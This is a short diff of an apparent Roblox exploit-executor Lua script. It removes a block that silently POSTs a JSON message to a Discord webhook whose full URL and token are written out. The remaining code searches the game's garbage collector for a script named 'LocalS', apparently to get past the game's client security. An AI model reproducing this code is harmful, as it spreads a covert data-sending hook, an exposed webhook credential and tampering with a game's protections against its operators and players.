@@ -52,13 +52,6 @@ local msg = {
 	}}
 }
 
-local exp = http_request({
-	Url = "https://discord.com/api/webhooks/931949264526012486/-4g2kKF2GsoF4EC8d6Fp-0zK0ri8__HS_88czQLhTBh6mCCnwlE8DAZCc7XuVBC91t_D";
-	Method = "POST";
-	Headers = {['Content-Type'] = 'application/json'};
-	Body = game:GetService('HttpService'):JSONEncode(msg)
-})
-
 local remotesecurity
 for i,v in pairs(getgc()) do
 	if getfenv(v).script and getfenv(v).script.Name == "LocalS" then
